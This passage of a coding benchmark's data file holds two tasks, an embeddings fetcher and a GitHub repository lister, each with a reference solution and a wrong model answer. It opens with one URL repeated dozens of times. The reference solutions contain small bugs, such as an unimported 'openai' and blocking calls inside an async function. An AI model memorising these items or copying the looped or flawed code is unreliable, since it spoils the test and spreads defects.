\"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API, depending on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding (vector representation) for a given word using either a local HTTP API or OpenAI's API. It handles both types of API calls, processes the response, and returns the embedding as a NumPy array. If the request fails, it prints an error message and returns None.\n\nInput:  \n- `word` (str): The word or text to generate an embedding for.  \n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.5\".  \n\nOutput:  \n- `numpy.ndarray` or `None`: Returns the word embedding as a NumPy array if successful; otherwise, returns None.  \n\nNote: The function assumes the local API endpoint is running at `http://localhost:8000/v1/embeddings` and expects a JSON payload with `model` and `input` fields. For OpenAI's API, it assumes the `openai` library is properly configured.",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport numpy as np\nimport openai\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    try:\n        if model == \"vicuna-7b-v1.5\":\n            response = requests.post(\"http://localhost:8000/v1/embeddings\", json={\"model\": model, \"input\": word})\n            response.raise_for_status()\n            embedding = np.array(response.json()[\"embedding\"])\n        else:\n            response = openai.Embedding.create(input=word, model=model)\n            embedding = np.array(response[\"data\"][0][\"embedding\"])\n        return embedding\n    except requests.exceptions.RequestException as e:\n        print(f\"Error: {e}\")\n    except openai.error.OpenAIError as e:\n        print(f\"Error: {e}\")\n    return None\n```"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a function to fetch all repositories from a GitHub organization using the GitHub API.\n\nFunction Description: The function `fetch_github_repos` asynchronously retrieves all repositories belonging to a specified GitHub organization. It handles pagination to ensure all repositories are fetched, even if they span multiple pages. The function uses the GitHub REST API with proper authentication and headers.\n\nInput:\n- `org_name` (str): The name of the GitHub organization whose repositories are to be fetched.\n- `token` (str): A GitHub personal access token for authentication.\n\nOutput:\n- Returns a list of dictionaries, where each dictionary represents a repository from the organization. Returns an empty list if the request fails or no repositories are found.",
    "Canonical_solution": "import requests\ntoken = \"YOUR_GITHUB_TOKEN\"\n\nasync def fetch_github_repos(org_name, token):\n    url = f\"https://api.github.com/orgs/{org_name}/repos\"\n    headers = {\n        \"Accept\": \"application/vnd.github+json\",\n        \"Authorization\": f\"Bearer {token}\",\n        \"X-GitHub-Api-Version\": \"2022-11-28\",\n    }\n\n    params = {\n        \"per_page\": 100  # You can adjust this number (max is 100)\n    }\n\n    all_repos = []\n\n    while url:\n        response = requests.get(url, headers=headers, params=params)\n\n        if response.status_code == 200:\n            repos = response.json()\n            all_repos.extend(repos)\n\n            # Check if there is a 'next' page\n            if \"next\" in response.links:\n                url = response.links[\"next\"][\"url\"]\n            else:\n                url = None\n        else:\n            print(\n                f\"Failed to fetch repositories: {response.status_code} - {response.text}\"\n            )\n            break\n\n    return all_repos",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport aiohttp\nimport asyncio\n\nasync def fetch_github_repos(org_name, token):\n    headers = {\n        'Authorization': f'token {token}',\n        'Accept': 'application/vnd.github.v3+json'\n    }\n    url = f'https://api.github.com/orgs/{org_name}/repos'\n    repos = []\n    async with aiohttp.ClientSession(headers=headers) as session:\n        while url:\n            async with session.get(url) as response:\n                if response.status == 200:\n                    data = await response.json()\n                    repos.extend(data)\n                    url = response.links.get('next', {}).get('url')\n                else:\n                    print(f'Error fetching repositories: {response.status}')\n                    return []\n    return repos\n```\n"
  }
]